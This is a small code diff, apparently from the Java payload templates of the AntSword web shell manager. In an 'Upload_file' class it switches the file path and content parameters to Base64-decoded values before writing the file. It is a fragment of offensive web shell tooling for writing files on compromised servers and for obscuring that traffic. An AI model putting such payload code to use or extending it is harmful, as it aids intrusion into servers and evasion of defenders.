@@ -8,8 +8,8 @@ import java.io.FileOutputStream;
 public class Upload_file extends Template {
     @Override
     public String run() throws Exception {
-        String z1 = getParam("antswordargpath");
-        String z2 = getParam("antswordargcontent");
+        String z1 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
+        String z2 = new String(this.Base64DecodeToByte("antswordargcontent"), this.cs);
         return UploadFileCode(z1, z2);
 
     }
